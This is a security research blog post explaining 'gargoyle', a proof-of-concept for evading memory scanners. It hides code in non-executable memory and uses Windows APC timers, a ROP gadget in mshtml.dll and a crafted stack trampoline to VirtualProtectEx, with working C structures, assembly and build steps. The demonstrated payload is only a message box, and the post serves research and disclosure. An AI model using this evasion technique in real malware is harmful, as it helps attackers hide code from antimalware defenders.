# https://lospi.net/security/assembly/c/cpp/developing/software/2017/03/04/gargoyle-memory-analysis-evasion.html

* * *

## gargoyle, a memory scanning evasion technique

March 4, 2017

![](https://lospi.net/images/Gargoyle.svg)

[gargoyle](https://github.com/JLospinoso/gargoyle) is a technique for hiding _all_ of a program’s executable code in non-executable memory. At some programmer-defined interval, gargoyle will wake up–and with some ROP trickery–mark itself executable and do some work:

![gargoyle Infographic](https://raw.githubusercontent.com/JLospinoso/gargoyle/master/infographic_web.png)

The technique is demonstrated for 32-bit Windows [here](https://github.com/JLospinoso/gargoyle). In this post, we’ll dig through all the gritty details of how it’s implemented.

# Live memory analysis

Performing live memory analysis can be a really expensive operation–if you use Windows Defender, you may have been on the business end of this problem (just Google [“Antimalware Service Executable”](https://www.google.com/search?q=live+memory+analysis+&ie=utf-8&oe=utf-8#q=antimalware+service+executable&*)). Since programs must reside in executable memory, a common technique for reducing computational burden is to limit analysis on executable code pages only. In many processes, this will reduce the amount of memory to analyze by an order of magnitude.

gargoyle demonstrates that this is a risky approach. Through the use of Windows Asynchronous Procedure Calls, read/write only memory can be invoked as executable memory to perform some tasks. Once it has completed running its tasks, it returns to read/write memory until a timer expires. Then the loop repeats.

Of course, there’s no `InvokeNonExecutableMemoryOnTimerEx` Windows API. Getting the loop going requires some work…

# Windows Asynchronous Procedure Calls (APC)

[Asynchronous programming](https://msdn.microsoft.com/en-us/library/windows/desktop/ms681951(v=vs.85).aspx) allows some task to be executed at a later date, potentially in the context of a separate thread of execution. Each thread has its own [APC Queue](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684954(v=vs.85).aspx), and when a thread is put into an [alertable state](https://msdn.microsoft.com/en-us/library/windows/desktop/aa363772(v=vs.85).aspx), Windows will dispatch work from the APC queue to the waiting thread.

There are a bunch of ways to queue APCs:

- [ReadFileEx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365468(v=vs.85).aspx)
- [SetWaitableTimer](https://msdn.microsoft.com/en-us/library/windows/desktop/ms686289(v=vs.85).aspx)
- [SetWaitableTimerEx](https://msdn.microsoft.com/en-us/library/windows/desktop/dd405521(v=vs.85).aspx)
- [WriteFileEx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365748(v=vs.85).aspx)

And a bunch of ways to enter an alertable state:

- [SleepEx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms686307(v=vs.85).aspx)
- [SignalObjectAndWait](https://msdn.microsoft.com/en-us/library/windows/desktop/ms686293(v=vs.85).aspx)
- [MsgWaitForMultipleObjectsEx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684245(v=vs.85).aspx)
- [WaitForMultipleObjectsEx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms687028(v=vs.85).aspx)
- [WaitForSingleObjectEx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms687036(v=vs.85).aspx)

The combination we’ll be employing is to create a timer with `CreateWaitableTimer`and then queue APCs with `SetWaitableTimer`:

```
HANDLE WINAPI CreateWaitableTimer(
  _In_opt_ LPSECURITY_ATTRIBUTES lpTimerAttributes,
  _In_     BOOL                  bManualReset,
  _In_opt_ LPCTSTR               lpTimerName
);
```

The default security attributes are fine, we don’t want to manually reset, and we don’t want a named timer. So all of the arguments to `CreateWaitableTimer` are `0` or `nullptr`. This function returns a `HANDLE` to our newly minted timer. Next, we must configure it:

```
BOOL WINAPI SetWaitableTimer(
  _In_           HANDLE           hTimer,
  _In_     const LARGE_INTEGER    *pDueTime,
  _In_           LONG             lPeriod,
  _In_opt_       PTIMERAPCROUTINE pfnCompletionRoutine,
  _In_opt_       LPVOID           lpArgToCompletionRoutine,
  _In_           BOOL             fResume
);
```

The first argument is the handle we got from `CreateWaitableTimer`. The `pDueTime` argument is a pointer to a `LARGE_INTEGER` that specifies the time of the first timer expiry. For the example, we simply zero this out (expire immediately). The `lPeriod` defines the expiration interval in milliseconds. This determines the frequency at which gargoyle is invoked.

The next argument, `pfnCompletionRoutine` will be the subject of some considerable effort on our part. This is the address that Windows calls from the waiting thread. Sounds simple, except that none of gargoyle’s code is in executable memory at the time the APC is dispatched. If we were to point `pfnCompletionRoutine` at gargoyle, we’d end up with a [data execution prevention (DEP)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx) violation. Weird, I know.

Instead, we use an exotic kind of [ROP gadget](https://en.wikipedia.org/wiki/Return-oriented_programming) that will reorient the stack of the executing thread to the address pointed to by `lpArgToCompletionRoutine`, the next argument to `SetWaitableTimer`. When the ROP gadget `ret`s, the specially crafted stack helpfully calls into `VirtualProtectEx` to mark gargoyle executable before tail-calling into gargoyle’s first instruction.

The last argument has to do with whether to wake up a sleeping computer when the timer expires. We set this to `false` for this proof of concept.

# Windows Data Execution Prevention and `VirtualProtectEx`

The final piece is the venerable [VirtualProtectEx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366899(v=vs.85).aspx), which marks memory with various protection attributes:

```
BOOL WINAPI VirtualProtectEx(
  _In_  HANDLE hProcess,
  _In_  LPVOID lpAddress,
  _In_  SIZE_T dwSize,
  _In_  DWORD  flNewProtect,
  _Out_ PDWORD lpflOldProtect
);
```

We are going to call `VirtualProtectEx` in two contexts: after gargoyle has completed executing (before we make the thread alertable) and before gargoyle starts executing (after the thread has been dispatched for APC completion). See the infographic for more details.

In this proof of concept, we keep gargoyle, the trampoline, the ROP gadget, and our read/write memory all in the same process, so the first argument `hProcess` can be set equal to [GetCurrentProcess](https://msdn.microsoft.com/en-us/library/windows/desktop/ms683179(v=vs.85).aspx). The next argument, `lpAddress`, corresponds to the address of gargoyle and `dwSize` corresponds to the size of gargoyle’s executable memory. We provide the desired [protection attributes](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx) to `flNewProtect`. We don’t care about the old protection attributes, but unfortunately `lpflOldProtect` is not an optional argument. So we will point this at some empty memory we’ve set aside.

The only argument that will differ depending context is the `flNewProtect`. When gargoyle goes to sleep, we want to mark it `PAGE_READWRITE` or `0x04`. Before gargoyle gains execution, we want to mark it `PAGE_EXECUTE_READ` or `0x20`.

# The Stack Trampoline

_Note: If you are not familiar with x86 calling conventions, this section will be hard to understand. See my post on [x86 calling conventions](https://jlospinoso.github.io/assembly/c/developing/software/2015/04/04/common-x86-calling-conventions.html) for a refresher._

In the usual case, ROP gadgets are used to defeat DEP by doing a little bit of work at a time to build up a call into `VirtualProtectEx` to e.g. mark the stack executable then tail call off to an address on the stack. This is often useful in exploit development, when an attacker can write to non-executable memory and needs a way to animate it. It is possible to [chain some number of ROP gadgets together](https://github.com/pakt/ropc) to do quite a bit of work.

Unfortunately, we do not have control over very much of the context of our alerted thread. We can control (a) the instruction pointer `eip` via `pfnCompletionRoutine` and (b) a pointer on the stack of the alerted thread at location `esp+4`, i.e. the first argument to the invoked function since it is a `WINAPI`/`__stdcall` callback.

Fortunately, we already have full execution before the APC even gets queued, so we can carefully craft a new stack–a _stack trampoline_–for our alerted thread. Our strategy is to find a ROP gadget that replaces `esp` to point at our stack trampoline. Anything of the following form would work:

```asm
pop * ; Some instruction that adds 4 to esp
pop esp
ret
```

It’s a little exotic, since functions don’t usually end with a `pop esp`/`ret`, but fortunately Intel x86 assembly produces very dense executable memory [thanks to variable-length opcodes](https://cseweb.ucsd.edu/~hovav/dist/rop.pdf). Anyway, there’s one such gadget in 32-bit `mshtml.dll` at offset `7165405` from base:

```asm
pop ecx
pop esp
ret
```

_Note: Thanks to [Sascha Schirra’s](https://github.com/sashs) excellent [Ropper](https://github.com/sashs/Ropper) tool._

This gadget will set `esp` equal to whatever value we put into `lpArgToCompletionRoutine` when we called `SetWaitableTimer`. All that’s left to do now is have `lpArgToCompletionRoutine` point to some carefully crafted memory that looks like a stack. This _stack trampoline_ looks like this:

```
struct StackTrampoline {
  void* VirtualProtectEx;    // <-- ESP here; ROP gadget rets
  void* return_address;      // Tail-call to gargoyle
  void* current_process;     // First arg to VirtualProtectEx
  void* address;
  uint32_t size;
  uint32_t protections;
  void* old_protections_ptr;
  uint32_t old_protections;  // Last arg to VirtualProtectEx
  void* setup_config;        // First argument to gargoyle
};
```

We set `lpArgToCompletionRoutine` equal to the `void* VirtualProtectEx` argument so that the ROP gadget `ret`s and `VirtualProtectEx` gets called. When `VirtualProtectEx` receives this call, `esp` will be pointing at `void* return_address`. We’ve conveniently set this to–you guessed it–our now-executable gargoyle, and Bob’s your uncle!

# `gargoyle`

Let’s pause for a moment and take a look at the read/write `Workspace` we set up before creating the timer and kicking off the loop. The `Workspace` contains three main components: some configuration to help gargoyle bootstrap itself, stack space, and the `StackTrampoline`:

```
struct Workspace {
  SetupConfiguration config;
  uint8_t stack[stack_size];
  StackTrampoline tramp;
};
```

You’ve already seen the `StackTrampoline`, and `stack` is just a chunk of memory. The `SetupConfiguration` looks like this:

```
struct SetupConfiguration {
  uint32_t initialized;
  void* setup_address;
  uint32_t setup_length;
  void* VirtualProtectEx;
  void* WaitForSingleObjectEx;
  void* CreateWaitableTimer;
  void* SetWaitableTimer;
  void* MessageBox;
  void* tramp_addr;
  void* sleep_handle;
  uint32_t interval;
  void* target;
  uint8_t shadow[8];
};
```

Inside of the proof of concept harness in `main.cpp`, the `SetupConfiguration` is set up this way:

```
config.setup_address = setup_memory;     // Address of gargoyle
config.setup_length = static_cast<uint32_t>(setup_size);
config.VirtualProtectEx = VirtualProtectEx;
config.WaitForSingleObjectEx = WaitForSingleObjectEx;
config.CreateWaitableTimer = CreateWaitableTimerW;
config.SetWaitableTimer = SetWaitableTimer;
config.MessageBox = MessageBoxA;
config.tramp_addr = &tramp;               // Address of stack trampoline
config.interval = invocation_interval_ms; // e.g. 15000
config.target = gadget_memory;            // Address of ROP gadget
```

Pretty simple. It’s basically just pointers to various Windows functions and some helpful arguments.

Now that you have an idea of what the `Workspace` looks like, let’s get back to gargoyle. Once the stack trampoline has invoked `VirtualProtectEx` and the tail call kicks in, gargoyle has execution. At this point, `esp` is pointing at `old_protections` since `VirtualProtectEx` is `WINAPI`/`__stdcall` and will clean up after itself.

Notice we’ve put an extra argument, `void* setup_config`, at the end of `StackTrampoline`. This is conveniently placed as if it were the first argument to invoking gargoyle as a `__cdecl`/`__stdcall` function.

This allows gargoyle to find its read/write configuration in memory:

```asm
mov ebx, [esp+4] ; Configuration in ebx now
lea esp, [ebx + Configuration.trampoline - 4] ; Bottom of "stack"
mov ebp, esp
```

Now we’re ready to rock. `esp` is pointing at `Workspace.stack`. We’ve got a hold of a `Configuration` object in `ebx`. If this is the first time gargoyle is called, we’ll need to setup the timer. We check for this by looking up the `initialized` field on `Configuration`:

```asm
; If we're initialized, skip to trampoline fixup
mov edx, [ebx + Configuration.initialized]
cmp edx, 0
```

If gargoyle is already initialized, we jump past all the timer setup.

```asm
jne reset_trampoline

; Create the timer
push 0
push 0
push 0
mov ecx, [ebx + Configuration.CreateWaitableTimer]
call ecx
mov [ebx + Configuration.sleep_handle], eax

; Set the timer
push 0
mov ecx, [ebx + Configuration.trampoline_addr]
push ecx
mov ecx, [ebx + Configuration.gadget]
push ecx
mov ecx, [ebx + Configuration.interval]
push ecx
lea ecx, [ebx + Configuration.shadow]
push ecx
mov ecx, [ebx + Configuration.sleep_handle]
push ecx
mov ecx, [ebx + Configuration.SetWaitableTimer]
call ecx

; Set the initialized bit
mov [ebx + Configuration.initialized], dword 1

; Replace the return address on our trampoline
reset_trampoline:
mov ecx, [ebx + Configuration.VirtualProtectEx]
mov [ebx + Configuration.trampoline], ecx
```

Notice that at `reset_trampoline` we reinstall the address of `VirtualProtectEx` onto the stack trampoline. After the ROP gadget `ret`s, `VirtualProtectEx` executes. When it does, it will clobber its address on the stack trampoline during normal function execution.

At this point, you get to execute arbitrary code. For the proof of concept, we pop a message box:

```asm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;; Arbitrary code goes here. Note that the
;;;; default stack is pretty small (65k).
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Pop a MessageBox as example
push 0          ; null
push 0x656c796f ; oyle
push 0x67726167 ; garg
mov ecx, esp
push 0x40       ; Info box
push ecx        ; ptr to 'gargoyle' on stack
push ecx        ; ptr to 'gargoyle' on stack
push 0
mov ecx, [ebx + Configuration.MessageBox]
call ecx
mov esp, ebp
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
```

Once we’re done executing, we need to set up our tail calls to `VirtualProtectEx` then `WaitForSingleObjectEx`. We actually set up two calls to `WaitForSingleObjectEx`, since the APC will return from the first and continue executing. This enables us to loop APCs indefinitely:

```asm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;; Time to setup tail calls to go down
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Setup arguments for WaitForSingleObjectEx x1
push 1
push 0xFFFFFFFF
mov ecx, [ebx + Configuration.sleep_handle]
push ecx
push 0 ; Return address never ret'd

; Setup arguments for WaitForSingleObjectEx x2
push 1
push 0xFFFFFFFF
mov ecx, [ebx + Configuration.sleep_handle]
push ecx
; Tail call to WaitForSingleObjectEx
mov ecx, [ebx + Configuration.WaitForSingleObjectEx]
push ecx

; Setup arguments for VirtualProtectEx
lea ecx, [ebx + Configuration.shadow]
push ecx
push 2 ; PAGE_READONLY
mov ecx, [ebx + Configuration.setup_length]
push ecx
mov ecx, [ebx + Configuration.setup_addr]
push ecx
push dword 0xffffffff
; Tail call to WaitForSingleObjectEx
mov ecx, [ebx + Configuration.WaitForSingleObjectEx]
push ecx

; Jump to VirtualProtectEx
mov ecx, [ebx + Configuration.VirtualProtectEx]
jmp ecx
```

# Trying it out

The source for the proof of concept is [on github](https://github.com/JLospinoso/gargoyle) and you can try it out easily, but you must have the following installed:

- [Visual Studio](https://www.visualstudio.com/downloads/): 2015 Community is tested, but it may work for other versions.
- [Netwide Assembler](https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D) v2.12.02 x64 is tested, but it may work for other versions. Make sure `nasm.exe` is on your path.

Clone _gargoyle_:

```
git clone https://github.com/JLospinoso/gargoyle.git
```

Open `Gargoyle.sln` and build.

You must run gargoyle.exe in the same directory as `setup.pic`. By default, this is in `Debug` or `Release`, the output directories of the solution.

Every 15 seconds, gargoyle will pop up a message box. When you click ok, gargoyle completes with the `VirtualProtectEx`/`WaitForSingleObjectEx` tail call.

For fun, use [Sysinternals’s excellent VMMap tool](https://technet.microsoft.com/en-us/sysinternals/vmmap.aspx) to examine when _gargoyle_’s PIC is executable. If a message box is active, _gargoyle_ will be executable. If it is not, _gargoyle_ should not be executable. The PIC’s address is printed to `stdout` just before the harness calls into the PIC.

# Feedback

Please [post any issues or bugs](https://github.com/JLospinoso/gargoyle/issues) you find!

#### Related Posts

26 Dec 2021 » [Mashing CDC and DoT Data](https://lospi.net/data/statistics/covid/cdc/r/2021/12/26/covid-travel-mashup.html)

30 Jan 2020 » [C++ Resources, Lifetimes, and Ownership](https://lospi.net/c/c++/programming/developing/software/infosec/2020/01/30/cpp-resources-lifetimes-ownership.html)

11 Jan 2020 » [C++ for Hackers](https://lospi.net/c/c++/programming/developing/software/infosec/2020/01/11/cpp-for-hackers.html)

* * *